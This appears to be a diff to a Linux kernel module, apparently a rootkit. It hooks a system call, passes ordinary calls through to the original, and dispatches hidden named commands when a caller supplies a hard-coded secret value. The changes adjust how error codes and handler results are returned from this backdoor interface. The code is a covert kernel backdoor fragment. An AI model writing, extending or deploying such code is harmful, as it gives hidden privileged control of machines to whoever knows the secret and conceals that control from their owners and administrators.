@@ -48,19 +48,26 @@ static struct sctm_hook iface__hook = {
 };
 static unsigned long iface__secret = 0xDEADBEEFDEADBEEF;
 
+/*
+delegate based on whether the secret is provided,
+and return the delegate's absolute return value
+*/
 unsigned long iface_hook_func(unsigned long secret, char __user *command,
     unsigned long arg0, unsigned long arg1, unsigned long arg2,
     unsigned long arg3) {
   char command_buf[100]; /* easier than `kmalloc`ing */
   iface_command_handler_t handler;
   unsigned int i;
+  long retval;
   
   if (!iface__hook.hooked)
-    return -EINVAL;
+    return EINVAL;
 
   /* need correct secret */
 
   if (secret != iface__secret)
+    /* the original should already return a positive value */
+
     return (*iface__hook.original)(secret, (unsigned long) command, arg0,
       arg1, arg2, arg3);
 
@@ -85,11 +92,17 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
     }
   }
 
-  if (handler != NULL)
-    /* the command exists, and has a handler */
+  if (handler != NULL) {
+    /*
+    the command exists, and has a handler
 
-    return (unsigned long) (*handler)(arg0, arg1, arg2, arg3);
-  return -EINVAL;
+    return its absolute return value
+    */
+
+    retval = (*handler)(arg0, arg1, arg2, arg3);
+    return retval < 0 ? -retval : retval;
+  }
+  return EINVAL;
 }
 
 int iface_init(void) { 
